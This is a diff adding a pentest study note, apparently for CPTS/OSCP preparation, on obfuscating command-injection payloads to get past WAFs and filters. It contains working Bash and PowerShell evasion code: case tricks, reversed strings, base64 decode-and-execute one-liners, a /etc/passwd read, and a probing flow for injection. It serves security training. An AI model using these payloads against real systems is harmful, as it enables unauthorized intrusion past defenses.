@@ -1,0 +1,158 @@
+🧠 SUMMARY: Advanced Command Obfuscation
+When basic injection bypasses don’t work (quotes, ${IFS}, newlines, etc.), it's time to get creative. This section teaches how to sneak past WAFs and aggressive filters with:
+
+Case Manipulation
+
+Reversed Commands
+
+Encoded Payloads
+
+Shell Tricks in Bash & PowerShell
+
+You’re not just throwing whoami at the wall anymore — you’re forging new words that execute like old ones.
+
+🔁 IF THIS, THEN THAT (ITTTT)
+IF THIS	DO THAT
+Filter blocks your command like whoami, cat, etc.	Try case manipulation (e.g., WhOaMi)
+Still filtered (Linux)?	Use $(tr "[A-Z]" "[a-z]"<<<"WhOaMi") or ${a,,}
+WAF flags known words even with casing	Reverse the string using rev or PowerShell slice
+WAF filters characters (`	, ;, `, etc.)
+Bash-specific system	Use Bash subshells $(...), <<<, tr, rev, etc.
+PowerShell-specific system	Use iex "$(...)" with b64 + Unicode encoding
+Filters catch b64 or base64 usage	Swap in sh, openssl enc -d -base64, or hex via xxd
+🧪 TECHNIQUES & TOOLS
+1. 🔡 Case Manipulation
+Windows: Just change case. WhOaMi, WHOAMI, whatever.
+
+Linux: Bash is case-sensitive, so wrap with lowercase trick:
+
+bash
+Copy
+Edit
+$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
+$(a="WhOaMi";printf %s "${a,,}")
+2. 🔁 Reversed Commands
+Reverse the command using rev (Linux) or slicing (PowerShell):
+
+bash
+Copy
+Edit
+$(rev<<<'imaohw')
+powershell
+Copy
+Edit
+iex "$('imaohw'[-1..-20] -join '')"
+3. 🔐 Encoded Commands (Base64)
+🐧 Linux:
+Encode your real command:
+
+bash
+Copy
+Edit
+echo -n 'cat /etc/passwd | grep 33' | base64
+Output: Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==
+
+Decode + execute:
+
+bash
+Copy
+Edit
+bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
+✅ No |, no ;, no spaces.
+
+🪟 Windows:
+Encode:
+
+powershell
+Copy
+Edit
+[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))
+Decode + execute:
+
+powershell
+Copy
+Edit
+iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"
+🔄 PATTERNS TO MEMORIZE
+Goal	Pattern
+Lowercase obfuscation	$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
+Reverse command	$(rev<<<'imaohw')
+Base64 decode + execute	bash<<<$(base64 -d<<<...)
+PowerShell base64 exec	iex "$(...decode logic...)”
+Hide command keywords	w'h'o'am'i, w"h"o'am"i
+🧨 FINAL THOUGHTS
+❗️These techniques are surgical. They're used when:
+
+You're up against a solid WAF.
+
+You’re in a real-world pentest.
+
+You’re taking CPTS, OSCP, or doing CTFs that punish “basic” payloads.
+
+💀 Most devs never expect:
+
+Custom encoded payloads
+
+Character slicing
+
+Rev-based reversal
+
+Bash/PowerShell hybrid voodoo
+
+🧰 Tools to Automate All This (Later Section Will Cover)
+obfs4, Invoke-Obfuscation, Obfuscator.io
+
+PayloadsAllTheThings → Command Injection, Bash Tricks, PowerShell Obfuscation
+
+
+
+💡 TL;DR:
+Yes, it's mostly “throw it at the wall and see what sticks” at first — but there are clues and logic you can follow before brute-force creativity kicks in.
+
+🧠 Step-by-Step Flow (What to Try and When):
+1. Initial Recon & Payload Test
+Try a basic: 127.0.0.1; whoami
+
+If blocked → look at:
+
+Error returned (custom app message? WAF page?)
+
+Does it still ping? (might tell you partial command was accepted)
+
+2. Try Basic Operators First
+;, &&, ||, %0a
+
+See what’s allowed. You’ll quickly know what chars are being filtered.
+
+3. Space Bypass Attempts
+${IFS}, %09, {ls,-la}
+
+If whoami works, but not with a space: you know it’s a space filter.
+
+4. Command Word Blocked?
+Test w'h'o'am'i, w"h"oami, who$@ami, etc.
+
+If those work: it’s a blacklisted word, not behavior.
+
+🧬 If That Fails → Advanced Obfuscation Mode
+At this point, you're in creative territory. Here’s when to try the fancy stuff:
+
+Technique	When to Try
+Reversing (rev)	If literal whoami is blacklisted
+Case Manipulation	If blacklists are lowercase-only
+Base64 Encoded	If special chars are filtered, like `
+Char-by-char (tr)	If words are blocked but alphabet isn’t
+Command building (string concat)	If full words don’t fly, but individual letters do
+🛠️ Think of it like Lockpicking:
+Start with simple tools (tension + rake)
+
+If it doesn’t budge → go custom: single-pin picking, weird angles
+
+Your ears (or here, responses) tell you what the lock is doing
+
+⚔️ CPTS Mindset:
+If you see command injection works, you WILL get a shell. You just gotta pivot around whatever clown-ass filter the dev tossed in.
+
+No filter can stop you — just slow you down. But slowing down the wrong guy is still a losing game.
+
+
